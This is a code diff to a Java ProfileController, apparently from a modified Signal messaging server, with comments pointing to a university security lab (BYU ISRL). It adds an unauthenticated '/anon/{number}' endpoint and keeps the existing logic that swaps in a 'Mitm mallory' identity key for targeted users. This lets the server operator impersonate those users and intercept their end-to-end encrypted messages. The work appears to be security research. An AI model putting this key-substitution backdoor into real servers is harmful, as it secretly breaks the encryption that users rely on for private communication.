@@ -80,7 +80,7 @@ public class ProfileController {
   public Profile getProfile(@Auth Account account,
                             @PathParam("number") String number,
                             @QueryParam("ca") boolean useCaCertificate)
-      throws RateLimitExceededException
+          throws RateLimitExceededException
   {
     rateLimiters.getProfileLimiter().validate(account.getNumber());
 
@@ -107,8 +107,42 @@ public class ProfileController {
 
     // ISRL -> MITM
     return new Profile(accountProfile.get().getName(),
-                       accountProfile.get().getAvatar(),
-                       ik_serialized);
+            accountProfile.get().getAvatar(),
+            ik_serialized);
+  }
+
+  @Timed
+  @GET
+  @Produces(MediaType.APPLICATION_JSON)
+  @Path("/anon/{number}")
+  public Profile getProfileAnon(@PathParam("number") String number,
+                            @QueryParam("ca") boolean useCaCertificate)
+  {
+
+    Optional<Account> accountProfile = accountsManager.get(number);
+
+    if (!accountProfile.isPresent()) {
+      throw new WebApplicationException(Response.status(404).build());
+    }
+
+    Mitm mallory = Mitm.getInstance();
+    IdentityKey ik = mallory.getManager().getIdentity();
+    // System.out.println("IDENTITY KEY FOR -> " + account.getNumber() + " is " + accountProfile.get().getIdentityKey());
+    // System.out.println("IDENTITY KEY FOR -> MALLORY is " + org.whispersystems.textsecuregcm.util.Base64.encodeBytes(ik.serialize()));
+
+    // BYU ISRL <->
+    String ik_serialized;
+    if (mallory.isTargetedUser(number)) {
+      ik_serialized = org.whispersystems.textsecuregcm.util.Base64.encodeBytes(ik.serialize());
+    }
+    else {
+      ik_serialized = accountProfile.get().getIdentityKey();
+    }
+
+    // ISRL -> MITM
+    return new Profile(accountProfile.get().getName(),
+            accountProfile.get().getAvatar(),
+            ik_serialized);
   }
 
   @Timed
